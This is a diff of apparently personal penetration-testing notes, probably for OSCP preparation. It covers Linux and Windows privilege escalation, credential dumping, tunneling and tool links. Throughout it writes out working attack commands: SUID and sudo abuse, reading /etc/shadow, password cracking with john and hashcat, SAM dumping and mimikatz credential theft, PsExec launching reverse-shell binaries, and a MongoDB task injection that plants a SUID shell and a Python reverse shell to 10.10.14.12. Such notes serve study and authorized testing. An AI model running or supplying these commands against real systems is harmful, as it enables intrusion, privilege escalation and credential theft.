                Dirsearch — https://github.com/maurosoria/dirsearch
                GoBuster — https://github.com/OJ/gobuster
@@ -531,16 +562,14 @@ windows
                Nikto — https://github.com/sullo/nikto
                dirb — https://tools.kali.org/web-applications/dirb
                dirbuster — https://tools.kali.org/web-applications/dirbuster
+
       mysql
               ps aux |grep mysql
               mysql -u<id> -p<password> -e 'show databases;'
 
-////////////////////////////////Need to update////////////////////////////////////////////////////////////////////////////            
-4. Post-Exploitation && Privilege escalation
+8.	Post-Exploitation && Privilege escalation
      Goal
      Restricted low-priv shell --> Unrestricted low-priv shell --> Unrestricted high-priv shell -->Get more info
-          
-                                                              
      Searchsploit for remote execution 
           # e.g. searchsploit apach james  35513.py
           # Download and modify the python script. 
@@ -553,20 +582,18 @@ windows
           echo $SHELL     #which shell? majority of time "rbash"
           echo $PATH      #Where is it located?
           set             #gather information--> but which type
-
-
-   4.1 Linux     
-      4.1.1 Ref
-            https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-            https://guif.re/linuxeop
-            Dirtycow   https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
-            https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-            https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
-            http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+8.1.	Linux     
+Ref
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+https://guif.re/linuxeop
+Dirtycow   https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
       
-      which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
       
-      4.1.2 SUID/SGID  
+8.1.1.	SUID/SGID  
          user must have execute permission
             find / -perm /4000 -ls 2>/dev/null        #look for x on the user execution bit.  #USER ID
             find / -perm /2000 -ls 2>/dev/null        #Group id
@@ -585,7 +612,7 @@ windows
                https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
                https://linux.die.net/man/5/sudoers
                
-      4.1.3 sudo 
+8.1.2.	sudo 
             id     --> what is running? 
             sudo -l
                Anything suspicious?
@@ -595,13 +622,12 @@ windows
                   cd /mnt
                   cat /etc/shadow   
  	    sudo -u <another_user>
-      4.1.4 capability
+8.1.3.	capability
             getcap -r / 2>/dev/null
-            
-      4.1.5 cron
+8.1.4.	cron
             crontab -l
             cat /etc/crontab
-      4.1.6 Writable folder
+8.1.5.	Writable folder
             /tmp
             /var/tmp
             /dev/shm
@@ -609,22 +635,19 @@ windows
                   tmpfs = tempeorary file system. 
                   noexec,nosuid
              mount
-             
-      4.1.7  Dot in path
+8.1.6.	Dot in path
              echo $PATH            #high jack the path
              . in the path         #
              export PATH="$HOME/bin:$PATH"
              
-      4.1.8 Vunerlable software and services
+8.1.7.	Vulnerable software and services
          #search for software that is running as root
             ps aux
             ps -elf
 	    ps -eo user,command,pid
 	    ps -eo command
 	    	    IFX=$'\n'
-		    for i in $(ps -eo command);do echo $i ;done
-
-            
+		    for i in $(ps -eo command);do echo $i ;done          
             netstat -antp
 	    cat /etc/iptables/rules.*
 	    port knocking
@@ -646,10 +669,8 @@ windows
 		  sleep 1
 		  old_process=$new_process
 		done
-
-
-	    
-      4.1.9 Logs/stuff
+    
+8.1.8.	Logs/stuff
                ls -al /lib/systemd/system
                ls -latr /proc/1/exe
                stat /sbin/init
@@ -703,10 +724,7 @@ windows
                   *.*  @192.168.10.254:514         #remote server
                   #mail.*
             
-                
-                 
-      
-      4.1.10 Manual
+8.1.9.	Manual
          user enumeration
             groups
             ps aux     --> Search for odd program, then searchsploit. 
@@ -780,22 +798,14 @@ windows
             | base64
         Encryption
             scp
-                  
-               
-            
-               
-            
-
-      
-      
-      4.1.10  Auto tools
+8.1.10.	Auto tools
             https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
             https://raw.githubusercontent.com/reider-roque/linpostexp/master/linprivchecker.py
             https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
             https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
       
-      6.1.1 Restriced Shell excape  
-	       https://guif.re/linuxeop
+8.1.11.	Restricted Shell escape  
+	https://guif.re/linuxeop
                https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
                https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
           
@@ -819,11 +829,7 @@ windows
                         unshadow passwd shadow > hash
                         john --wordlist=/usr/share/wordlists/rockyou.txt hash
                         ./hashcat -m 7400 hases/sunday /usr/share/wordlists/rockyou.txt 
-
-               
-                  
-                  
-             nc interactive shell        #use without rlwrap
+8.1.12.	nc interactive shell        #use without rlwrap
                         # In reverse shell 
                               python -c 'import pty; pty.spawn("/bin/bash")' 
                               Ctrl-Z 
@@ -838,7 +844,7 @@ windows
                               export TERM=screen-256color 
                               stty rows <num> columns <cols>  
         
-   4.2 Windows           
+8.2.	 Windows           
         Hidden 
 	scheduled tasks (schtasks, strat from top)
 		  schtasks /query /fo LIST /v
@@ -959,8 +965,7 @@ windows
                   query session
                   DRIVERQUERY  --look for programs (afd..)
                      <check prefetch folder before execute wmic  c:\windows\prefetch>
-                  
-                  
+                                    
                   
                   wmic qfe get Caption,Description,HotFixID,InstalledOn
                   wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
@@ -1046,11 +1051,8 @@ windows
                          wmic neteventlog get name
                          
                     
-                  
-                  
-
-        
-      4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+8.2.1.	UAC Bypass   
+ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
              Look for following indicators
                    SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
                    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
@@ -1114,17 +1116,17 @@ windows
                       https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
                       PsExec64.exe -i -accepteula -d -s reverse_3333.exe
              
-      4.2.2 Passing another user's creds
+8.2.2.	Passing another user's creds
             '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'                       
                     
-      4.2.3 Saving Creds         
-            4.2.3.1 Manual
+8.2.3.	Saving Creds         
+8.2.3.1.	Manual
                 Windows Hash: Security Accounts Manager
                     reg save HKLM\SAM c:\SAM
                     reg save HKLM\System c:\System
                         --> Then smbserver to save back to kali. 
                     'samdump2 System SAM'
-            4.2.3.2 Auto
+8.2.3.2.	Auto
                 Gain admin priviliege
                 Run mimikatz
                   http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/
@@ -1132,7 +1134,7 @@ windows
                     token::elevate
                     lsadump::sam
                     sekurlsa::logonpasswords
-      4.2.4 Juicy Potato   - Golden privilege
+8.2.4.	Juicy Potato   - Golden privilege
             https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
             https://github.com/ivanitlearning/Juicy-Potato-x86/releases for x86
             
@@ -1190,13 +1192,7 @@ Windows Server 2003 SP2
          Possible Token HIjacking
    
    
-              
-  
-         
-      
-
-   
-MSF basic
+MSF basic listener
 https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
    msfconsole
    use exploit/multi/handler
@@ -1205,7 +1201,22 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
    set LPORT 4444
    exploit -j
    
-Tunneling
+
+Mongo use json format
+	mongo -p -u <id> <source_name>
+		db.tasks
+		db.tasks.in
+		db.tasks.insert( { "cmd" : "cp /bin/dash /tmp/pkong; chmod u+s /bin/dash;" } )
+		db.tasks.insert({"cmd": "chown tom:admin /tmp/pkong; chmod 6755 /tmp/pkong;"})
+		db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})# double check that the document got added properly.
+		db.tasks.insert({"cmd": "chmod u+s /tmp/pkong"})
+		db.find()
+		db.tasks.find()
+	/tmp/pkong -p
+	id   #check euid
+	
+
+9.	Tunneling
       Local Port Forward
       -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
       Remote Port Forward
@@ -1234,28 +1245,7 @@ Tunneling
                   ControlMaster auto
                   ControlPersist 10m
                   
-
-Mongo use json format
-	mongo -p -u <id> <source_name>
-		db.tasks
-		db.tasks.in
-		db.tasks.insert( { "cmd" : "cp /bin/dash /tmp/pkong; chmod u+s /bin/dash;" } )
-		db.tasks.insert({"cmd": "chown tom:admin /tmp/pkong; chmod 6755 /tmp/pkong;"})
-		db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})# double check that the document got added properly.
-		db.tasks.insert({"cmd": "chmod u+s /tmp/pkong"})
-		db.find()
-		db.tasks.find()
-	/tmp/pkong -p
-	id   #check euid
-	
-
-
-
-
-
-
-
-RE stuff
+10.	RE stuff
             compile x86 in linux x64 environment
                sudo apt-get install gcc-multilib
                gcc -ggdb -z execstack -fno-stack-protector -m32 func.c -o func
@@ -1270,73 +1260,21 @@ RE stuff
                   pdiss <functionname>
                   getsec
  	    strace ./binary
-	    r2 ./binary
+r2 ./binary
 	    	aaa
 		afl
 		vvv
-	    ltrace 
-	    	ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /../../etc > test
+	ltrace 
 	    
-		
-	    
-       
-
-https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
-
-
-Windows x86 Machine powershell location
-    C:\Windows\System32\WindowsPowerShell\v1.0
-    C:\Windows\SysWOW64\WindowsPowerShell\v1.0
+	 
     
-Windows x64 Machine Powershell location
-
-To launch a 64-bit version of PowerShell:
-    From a 32-bit process, use path:
-    c:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
-
-    From a 64-bit process, use path:
-    c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
-
-
-
-Powershell command
-    Download file 
-    Invoke-WebRequest URL -OutFile c:\file.ext
-    
-    
-    
-    
-    
-    
-Extra info,
-Don't know where to put those yet
-
-https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html#section-6-buffer-overflows
-
-
-
+11.	Extra info
 Reporting Frameworks
-
     Dradis — https://dradisframework.com/academy/industry/compliance/oscp/
     Serpico — https://github.com/SerpicoProject/Serpico
 
 Report Template
-
     Created by whoisflynn — https://github.com/whosiflynn/OSCP-Exam-Report-Template
-
-
-
-
-
-Network Tools
-
-    Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
-      host:    impacket-smbserver pkong .      
-      target:  
-               net use \\<IP>\pkong
-               
-               copy \\<IP>\pkong\file .
-               
 
 File Transfers
 
@@ -1344,17 +1282,14 @@ File Transfers
     scp - scp <id>@<ip>:<file location>/* ./
 
 Wordlists / Dictionaries
-
     SecLists — https://github.com/danielmiessler/SecLists
 
 Payload Generators
-
     Reverse Shell Generator — https://github.com/m0rph-1/revshellgen
     Windows Reverse Shell Generator — https://github.com/thosearetheguise/rev
     MSFVenom Payload Creator — https://github.com/g0tmi1k/msfpc
 
 PHP Reverse Shells
-
     Windows PHP Reverse Shell — https://github.com/Dhayalanb/windows-php-reverse-shell
     PenTestMonkey Unix PHP Reverse Shell — http://pentestmonkey.net/tools/web-shells/php-reverse-shell
     
@@ -1370,7 +1305,6 @@ Reverse shell
    
 
 Terminal Related
-
     tmux — https://tmuxcheatsheet.com/ (cheat sheet)
     tmux-logging — https://github.com/tmux-plugins/tmux-logging
     Oh My Tmux — https://github.com/devzspy/.tmux
@@ -1378,21 +1312,18 @@ Terminal Related
     Terminator — http://www.linuxandubuntu.com/home/terminator-a-linux-terminal-emulator-with-multiple-terminals-in-one-window
 
 Exploits
-
     Exploit-DB — https://www.exploit-db.com/
     Windows Kernel Exploits — https://github.com/SecWiki/windows-kernel-exploits
     AutoNSE — https://github.com/m4ll0k/AutoNSE
     Linux Kernel Exploits — https://github.com/lucyoa/kernel-exploits
 
 Password Brute Forcers
-
     BruteX — https://github.com/1N3/BruteX
     Hashcat — https://hashcat.net/hashcat/
     John the Ripper — https://www.openwall.com/john/
     
 
 Post-Exploitation / Privilege Escalation
-
     LinEnum — https://github.com/rebootuser/LinEnum
     linprivchecker —https://www.securitysift.com/download/linuxprivchecker.py
     Powerless — https://github.com/M4ximuss/Powerless
